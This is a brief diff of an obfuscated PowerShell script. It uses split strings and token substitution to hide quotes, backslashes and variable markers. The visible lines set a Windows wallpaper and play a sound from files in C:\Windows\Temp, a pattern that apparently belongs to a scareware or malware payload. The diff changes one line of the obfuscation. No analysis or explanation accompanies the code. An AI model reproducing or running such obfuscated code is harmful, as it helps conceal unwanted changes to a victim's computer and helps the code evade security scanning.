@@ -90,7 +90,7 @@ hpA@
 }
 
 Se'+'t-WallPaper -Path PDrC:9TBWindows9TBTemp9TBb.jpgPDr -Style Tile
-(New-Object -ComObject shell.applica'+'tion).toggleDesktop()
+(New-Object -ComObject shell.application).toggleDesktop()
 JMj'+'player = New-Obje'+'ct -TypeName Syste'+'m.Media.SoundPlayer
 JMjplayer.SoundLocation = PDrC:9TBWindows9TBTemp9TBa.wavPDr
 JMj'+'player.Load()
